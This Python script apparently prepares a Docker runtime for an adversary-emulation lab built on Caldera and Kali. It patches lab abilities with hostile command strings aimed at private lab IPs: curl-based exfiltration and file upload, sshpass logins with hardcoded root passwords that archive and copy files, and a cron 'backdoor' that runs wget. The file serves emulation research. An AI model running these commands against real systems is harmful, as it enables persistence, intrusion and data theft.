#!/usr/bin/env python3
"""
Prepare a temporary Docker runtime context for the frozen STICKS artifact.

The frozen artifact under sticks-docker/docker remains untouched. This script
copies it into a disposable runtime directory, repairs lost executable bits for
shell scripts, and resets stateful host-mounted directories so measurements run
from a clean substrate.
"""

from __future__ import annotations

import argparse
import json
import platform
import shutil
from dataclasses import dataclass
from pathlib import Path


MEASUREMENT_ROOT = Path(__file__).resolve().parent.parent
WORKSPACE_ROOT = MEASUREMENT_ROOT.parent.parent
STICKS_DOCKER_ROOT = WORKSPACE_ROOT / "sticks-docker"
SOURCE_DOCKER_ROOT = STICKS_DOCKER_ROOT / "docker"
SOURCE_CURATED_API_ROOT = STICKS_DOCKER_ROOT / "sticks" / "data" / "api"
RESULTS_DIR = MEASUREMENT_ROOT / "results"
RUNTIME_ROOT = MEASUREMENT_ROOT / "runtime"
DEFAULT_RUNTIME_CONTEXT_ROOT = RUNTIME_ROOT / "docker-context"
DEFAULT_RUNTIME_API_ROOT = RUNTIME_ROOT / "curated-api"
LATEST_JSON = RESULTS_DIR / "docker_runtime_context_latest.json"
LATEST_MD = RESULTS_DIR / "DOCKER_RUNTIME_CONTEXT_LATEST.md"
TRANSIENT_RELATIVE_DIRECTORIES = (
    Path("kali-data"),
    Path(".docker/db/dbdata"),
)
APT41_EXFIL_COMMAND = (
    "printf 'apt41-dust-onedrive-simulation\\n' > /tmp/apt41_dust_exfil.txt && "
    "for attempt in 1 2 3; do "
    "curl -fsS -X POST http://172.21.0.20:8080/store "
    "-H 'Content-Type: application/json' "
    "-d '{\"key\":\"onedrive_archive\",\"val\":\"apt41_dust_exfil.txt\"}' "
    "> /tmp/apt41_dust_exfil_response.json && "
    "curl -fsS http://172.21.0.20:8080/fetch/onedrive_archive "
    "| tee /tmp/apt41_dust_exfil_fetch.txt | grep -q 'apt41_dust_exfil.txt' && exit 0; "
    "sleep 2; "
    "done; "
    "exit 1"
)
APT41_ARCHIVE_COMMAND = (
    "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 "
    "'cp /etc/hosts /tmp/collected_data.txt && "
    "tar -czf /tmp/collected_data.tar.gz -C /tmp collected_data.txt && "
    "test -f /tmp/collected_data.tar.gz' && "
    "sshpass -p 'Passw0rd' scp -o StrictHostKeyChecking=no "
    "attacker@172.21.0.20:/tmp/collected_data.tar.gz /tmp/collected_data.tar.gz && "
    "test -f /tmp/collected_data.tar.gz"
)
APT41_INGRESS_COMMAND = (
    "for attempt in 1 2 3; do "
    "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "root@172.21.0.20 "
    "\"sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "root@172.22.0.20:/tmp/toolfile /tmp/toolfile\" && "
    "sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "root@172.21.0.20:/tmp/toolfile /tmp/toolfile && test -f /tmp/toolfile && exit 0; "
    "sleep 5; "
    "done; "
    "exit 1"
)
MIDNIGHTECLIPSE_CRON_COMMAND = (
    "for attempt in 1 2 3; do "
    "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "root@172.21.0.20 'echo \"wget http://localhost/backdor.sh\" > /root/backdoor_task.sh' && "
    "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && "
    "chmod 644 /etc/cron.d/backdoor_task' && exit 0; "
    "sleep 5; "
    "done; "
    "exit 1"
)
SALESFORCE_UPLOAD_COMMAND = (
    "for attempt in 1 2 3 4 5 6; do "
    "curl -fsS -F \"file=@/usr/lib/python3.13/io.py\" http://172.21.0.20:8116/upload && exit 0; "
    "sleep 10; "
    "done; "
    "exit 1"
)
SHADOWRAY_TOOL_ABILITY_ID = "5c0eccee-eee4-5d88-b6e5-shadowray"


def display_path(path: Path) -> str:
    path = path.resolve()
    for root in (WORKSPACE_ROOT, MEASUREMENT_ROOT):
        if path.is_relative_to(root):
            return path.relative_to(root).as_posix()
    for marker in ("docker-context", "curated-api", "sticks-docker", "sticks", "results"):
        if marker in path.parts:
            index = path.parts.index(marker)
            return Path(*path.parts[index:]).as_posix()
    return path.name or path.as_posix()


@dataclass(frozen=True)
class PreparedContext:
    output_dir: Path
    repaired_scripts: list[Path]
    reset_directories: list[Path]
    generated_conf_files: list[Path]
    architecture_patches: list[Path]
    prepared_api_root: Path
    api_overlay_patches: list[Path]


def normalize_host_architecture(host_architecture: str | None = None) -> str:
    raw_architecture = (host_architecture or platform.machine()).lower()
    if raw_architecture in {"arm64", "aarch64"}:
        return "arm64"
    if raw_architecture in {"x86_64", "amd64"}:
        return "amd64"
    return raw_architecture


def iter_shell_scripts(root: Path) -> list[Path]:
    return sorted(path for path in root.rglob("*.sh") if path.is_file())


def reset_transient_directories(output_dir: Path) -> list[Path]:
    reset_directories: list[Path] = []
    for relative_path in TRANSIENT_RELATIVE_DIRECTORIES:
        absolute_path = output_dir / relative_path
        if absolute_path.exists():
            shutil.rmtree(absolute_path)
        absolute_path.mkdir(parents=True, exist_ok=True)
        reset_directories.append(relative_path)
    return reset_directories


def repair_shell_permissions(output_dir: Path) -> list[Path]:
    repaired_scripts: list[Path] = []
    for shell_script in iter_shell_scripts(output_dir / ".docker"):
        current_mode = shell_script.stat().st_mode
        if current_mode & 0o100:
            continue
        shell_script.chmod(current_mode | 0o755)
        repaired_scripts.append(shell_script.relative_to(output_dir))
    return repaired_scripts


def ensure_caldera_runtime_config(output_dir: Path) -> list[Path]:
    caldera_conf_dir = output_dir / ".docker" / "caldera" / "conf"
    caldera_conf_dir.mkdir(parents=True, exist_ok=True)
    generated_files: list[Path] = []
    runtime_files = {
        caldera_conf_dir / "agents.yml": (
            "---\n"
            "bootstrap_abilities: []\n"
            "deadman_abilities: []\n"
            "implant_name: sandcat.go\n"
            "sleep_max: 3\n"
            "sleep_min: 3\n"
            "untrusted_timer: 30\n"
            "watchdog: 0\n"
            "deployments: []\n"
        ),
        caldera_conf_dir / "payloads.yml": (
            "---\n"
            "standard_payloads: {}\n"
            "special_payloads: {}\n"
            "extensions: {}\n"
        ),
    }
    for absolute_path, contents in runtime_files.items():
        if absolute_path.exists():
            continue
        absolute_path.write_text(contents, encoding="utf-8")
        generated_files.append(absolute_path.relative_to(output_dir))
    return generated_files


def apply_host_architecture_patches(output_dir: Path, host_architecture: str) -> list[Path]:
    patched_files: list[Path] = []
    if host_architecture != "arm64":
        return patched_files

    caldera_dockerfile = output_dir / ".docker" / "caldera" / "Dockerfile"
    if caldera_dockerfile.exists():
        caldera_text = caldera_dockerfile.read_text(encoding="utf-8")
        patched_caldera_text = caldera_text.replace(
            "go1.25.0.linux-amd64.tar.gz",
            "go1.25.0.linux-arm64.tar.gz",
        )
        if patched_caldera_text != caldera_text:
            caldera_dockerfile.write_text(patched_caldera_text, encoding="utf-8")
            patched_files.append(caldera_dockerfile.relative_to(output_dir))

    kali_dockerfile = output_dir / ".docker" / "kali" / "Dockerfile"
    if kali_dockerfile.exists():
        kali_text = kali_dockerfile.read_text(encoding="utf-8")
        patched_kali_text = kali_text.replace(
            "-H 'platform:linux' http://caldera:8888/file/download",
            "-H 'platform:linux' -H 'architecture:arm64' http://caldera:8888/file/download",
        )
        if patched_kali_text != kali_text:
            kali_dockerfile.write_text(patched_kali_text, encoding="utf-8")
            patched_files.append(kali_dockerfile.relative_to(output_dir))

    return patched_files


def load_api_bundle(path: Path) -> list[dict[str, object]]:
    return json.loads(path.read_text(encoding="utf-8"))


def write_api_bundle(path: Path, bundle: list[dict[str, object]]) -> None:
    path.write_text(json.dumps(bundle, indent=2) + "\n", encoding="utf-8")


def replace_executor_command(
    api_root: Path,
    filename: str,
    technique_id: str,
    command: str,
) -> Path:
    path = api_root / filename
    bundle = load_api_bundle(path)
    for ability in bundle:
        if ability.get("technique_id") != technique_id:
            continue
        executors = ability.get("executors", [])
        if not executors:
            raise RuntimeError(f"{filename} {technique_id} has no executors to patch.")
        executors[0]["command"] = command
        write_api_bundle(path, bundle)
        return Path(filename)
    raise RuntimeError(f"{filename} is missing technique {technique_id}.")


def replace_atomic_ordering_entry(
    api_root: Path,
    filename: str,
    old_ability_id: str,
    new_ability_id: str,
) -> Path:
    path = api_root / filename
    payload = json.loads(path.read_text(encoding="utf-8"))
    atomic_ordering = payload.get("atomic_ordering", [])
    try:
        index = atomic_ordering.index(old_ability_id)
    except ValueError as exc:
        raise RuntimeError(
            f"{filename} is missing adversary ability reference {old_ability_id}."
        ) from exc
    atomic_ordering[index] = new_ability_id
    path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    return Path(filename)


def replace_ability_id(
    api_root: Path,
    filename: str,
    old_ability_id: str,
    new_ability_id: str,
) -> Path:
    path = api_root / filename
    bundle = load_api_bundle(path)
    for ability in bundle:
        if ability.get("ability_id") != old_ability_id:
            continue
        ability["ability_id"] = new_ability_id
        write_api_bundle(path, bundle)
        return Path(filename)
    raise RuntimeError(f"{filename} is missing ability id {old_ability_id}.")


def prepare_curated_api_overlay(source_root: Path, output_dir: Path) -> tuple[Path, list[Path]]:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    shutil.copytree(source_root, output_dir)
    patched_files = {
        replace_executor_command(
            output_dir,
            "apt41_dust_dag-ability.json",
            "T1567.002",
            APT41_EXFIL_COMMAND,
        ),
        replace_executor_command(
            output_dir,
            "apt41_dust_dag-ability.json",
            "T1560.001",
            APT41_ARCHIVE_COMMAND,
        ),
        replace_executor_command(
            output_dir,
            "apt41_dust_dag-ability.json",
            "T1105",
            APT41_INGRESS_COMMAND,
        ),
        replace_executor_command(
            output_dir,
            "operation_midnighteclipse_dag-ability.json",
            "T1053.003",
            MIDNIGHTECLIPSE_CRON_COMMAND,
        ),
        replace_executor_command(
            output_dir,
            "salesforce_data_exfiltration_dag-ability.json",
            "T1587.001",
            SALESFORCE_UPLOAD_COMMAND,
        ),
        replace_atomic_ordering_entry(
            output_dir,
            "outer_space_dag-adversary.json",
            "6afb1856-6e5a-5f9f-8f8c-rothos",
            "a8de43be-fcde-5302-9cfd-rothos",
        ),
        replace_ability_id(
            output_dir,
            "shadowray_dag-ability.json",
            "5c0eccee-eee4-5d88-b6e5-c83b25d44eaa",
            SHADOWRAY_TOOL_ABILITY_ID,
        ),
        replace_atomic_ordering_entry(
            output_dir,
            "shadowray_dag-adversary.json",
            "5c0eccee-eee4-5d88-b6e5-c83b25d44eaa",
            SHADOWRAY_TOOL_ABILITY_ID,
        ),
    }
    return output_dir, sorted(patched_files)


def prepare_runtime_context(
    source_root: Path,
    output_dir: Path,
    host_architecture: str | None = None,
    api_overlay_dir: Path | None = None,
) -> PreparedContext:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    shutil.copytree(source_root, output_dir)
    reset_directories = reset_transient_directories(output_dir)
    repaired_scripts = repair_shell_permissions(output_dir)
    generated_conf_files = ensure_caldera_runtime_config(output_dir)
    architecture_patches = apply_host_architecture_patches(
        output_dir,
        normalize_host_architecture(host_architecture),
    )
    prepared_api_root, api_overlay_patches = prepare_curated_api_overlay(
        SOURCE_CURATED_API_ROOT,
        api_overlay_dir or output_dir.parent / "curated-api",
    )
    return PreparedContext(
        output_dir=output_dir,
        repaired_scripts=repaired_scripts,
        reset_directories=reset_directories,
        generated_conf_files=generated_conf_files,
        architecture_patches=architecture_patches,
        prepared_api_root=prepared_api_root,
        api_overlay_patches=api_overlay_patches,
    )


def render_markdown_summary(payload: dict[str, object]) -> str:
    repaired_scripts = payload["repaired_scripts"]
    reset_directories = payload["reset_directories"]
    generated_conf_files = payload["generated_conf_files"]
    architecture_patches = payload["architecture_patches"]
    api_overlay_patches = payload["api_overlay_patches"]
    lines = [
        "# Docker Runtime Context Preparation",
        "",
        f"- Host architecture: `{payload['host_architecture']}`",
        f"- Source Docker root: `{payload['source_docker_root']}`",
        f"- Prepared runtime root: `{payload['prepared_runtime_root']}`",
        f"- Prepared curated API root: `{payload['prepared_curated_api_root']}`",
        f"- Repaired shell scripts: `{len(repaired_scripts)}`",
        f"- Reset state directories: `{len(reset_directories)}`",
        f"- Generated runtime config files: `{len(generated_conf_files)}`",
        f"- Host architecture patches: `{len(architecture_patches)}`",
        f"- Curated API overlay patches: `{len(api_overlay_patches)}`",
        "",
        "## Reset Directories",
        "",
    ]
    for directory in reset_directories:
        lines.append(f"- `{directory}`")
    lines.extend(["", "## Repaired Shell Scripts", ""])
    for shell_script in repaired_scripts:
        lines.append(f"- `{shell_script}`")
    lines.extend(["", "## Generated Runtime Config Files", ""])
    for runtime_config in generated_conf_files:
        lines.append(f"- `{runtime_config}`")
    lines.extend(["", "## Host Architecture Patches", ""])
    for patched_file in architecture_patches:
        lines.append(f"- `{patched_file}`")
    lines.extend(["", "## Curated API Overlay Patches", ""])
    for patched_file in api_overlay_patches:
        lines.append(f"- `{patched_file}`")
    return "\n".join(lines).rstrip() + "\n"


def write_results(payload: dict[str, object]) -> tuple[Path, Path]:
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    json_text = json.dumps(payload, indent=2, sort_keys=True) + "\n"
    md_text = render_markdown_summary(payload)
    LATEST_JSON.write_text(json_text, encoding="utf-8")
    LATEST_MD.write_text(md_text, encoding="utf-8")
    return LATEST_JSON, LATEST_MD


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output-dir",
        type=Path,
        default=DEFAULT_RUNTIME_CONTEXT_ROOT,
        help="Workspace-local scratch directory for the prepared runtime context.",
    )
    parser.add_argument(
        "--api-overlay-dir",
        type=Path,
        default=DEFAULT_RUNTIME_API_ROOT,
        help="Workspace-local curated API overlay used by the measurement runner.",
    )
    return parser.parse_args()


def main() -> None:
    arguments = parse_args()
    output_dir = arguments.output_dir
    prepared = prepare_runtime_context(
        SOURCE_DOCKER_ROOT,
        output_dir,
        api_overlay_dir=arguments.api_overlay_dir,
    )
    payload = {
        "host_architecture": normalize_host_architecture(),
        "source_docker_root": display_path(SOURCE_DOCKER_ROOT),
        "prepared_runtime_root": display_path(prepared.output_dir),
        "prepared_curated_api_root": display_path(prepared.prepared_api_root),
        "reset_directories": [str(path) for path in prepared.reset_directories],
        "repaired_scripts": [str(path) for path in prepared.repaired_scripts],
        "generated_conf_files": [str(path) for path in prepared.generated_conf_files],
        "architecture_patches": [str(path) for path in prepared.architecture_patches],
        "api_overlay_patches": [str(path) for path in prepared.api_overlay_patches],
    }
    json_path, md_path = write_results(payload)
    print(f"Prepared runtime context at {prepared.output_dir}")
    print(f"Wrote JSON summary to {json_path}")
    print(f"Wrote Markdown summary to {md_path}")


if __name__ == "__main__":
    main()
